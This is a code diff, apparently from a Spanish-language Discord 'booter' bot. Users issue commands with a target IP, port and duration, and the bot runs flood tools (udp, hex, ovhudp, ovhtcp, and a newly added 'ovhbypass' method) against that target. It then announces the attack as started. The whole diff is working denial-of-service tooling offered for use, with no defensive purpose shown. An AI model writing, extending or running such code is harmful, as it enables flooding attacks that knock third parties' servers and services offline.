@@ -130,6 +130,10 @@ async def hex_command(ctx, ip: str = None, port: str = None, tiempo: str = None)
 async def udppps_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
     await realizar_ataque(ctx, 'udppps', ip, port, tiempo)
 
+@bot.command(name='ovhbypass')
+async def ovhbypass_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
+    await realizar_ataque(ctx, 'ovhbypass', ip, port, tiempo)
+
 @bot.command(name='ovhudp')
 async def ovhudp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
     await realizar_ataque(ctx, 'ovhudp', ip, port, tiempo)
@@ -137,10 +141,6 @@ async def ovhudp_command(ctx, ip: str = None, port: str = None, tiempo: str = No
 @bot.command(name='ovhtcp')
 async def ovhtcp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
     await realizar_ataque(ctx, 'ovhtcp', ip, port, tiempo)
-
-@bot.command(name='syn')
-async def syn_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
-    await realizar_ataque(ctx, 'syn', ip, port, tiempo)
 
 @bot.command(name='tcp')
 async def tcp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
@@ -191,6 +191,8 @@ async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
         comando = f'./hex {ip} {port_int} {tiempo_int}'
     elif metodo == 'udppps':
         comando = f'./udppps {ip} {port_int} {tiempo_int}'
+    elif metodo == 'ovhbypass':
+        comando = f'./ovhbypass {ip} {port_int} {tiempo_int}'
     elif metodo == 'ovhudp':
         comando = f'sudo ./ovhudp {ip} {port_int} 30 -1 {tiempo_int}'
     elif metodo == 'ovhtcp':
@@ -204,7 +206,7 @@ async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
     # Enviar mensaje de éxito con formato
     embed = discord.Embed(
         title="¡Ataque Iniciado!",
-        description=f"**TargetIP/Port:** {ip}:{port_int}\n**Método:** {metodo.upper()}\n**Tiempo:** {tiempo_int}",
+        description=f"**TargetIP/Port:** {ip}:{port_int}\n**Método:** {metodo.upper()}\n**Tiempo:** {tiempo_int}s",
         color=discord.Color.green()
     )
     embed.set_footer(text=f"Ataque enviado por {ctx.author.name}#{ctx.author.discriminator}", icon_url=ctx.author.avatar.url)
@@ -219,12 +221,12 @@ async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
 async def show_methods(ctx):
     embed = discord.Embed(
         title="Metodos Disponibles",
-        description="Se añadiran mas metodos en el futuro",
+        description="ovhbypass new method",
         color=discord.Color.blue()
     )
 
     embed.add_field(name="L4 UDP Protocol", value="`• udp`\n`• hex`\n`• udppps`\n`• ovhudp`", inline=False)
-    embed.add_field(name="L4 TCP Protocol", value="`• ovhtcp`\n`• tcp`", inline=False)
+    embed.add_field(name="L4 TCP Protocol", value="`• ovhtcp`\n`• tcp`\n`• ovhbypass`", inline=False)
 
     embed.set_footer(text=f"Solicitado por {ctx.author.name}#{ctx.author.discriminator}", icon_url=ctx.author.avatar.url)
     await ctx.send(embed=embed)
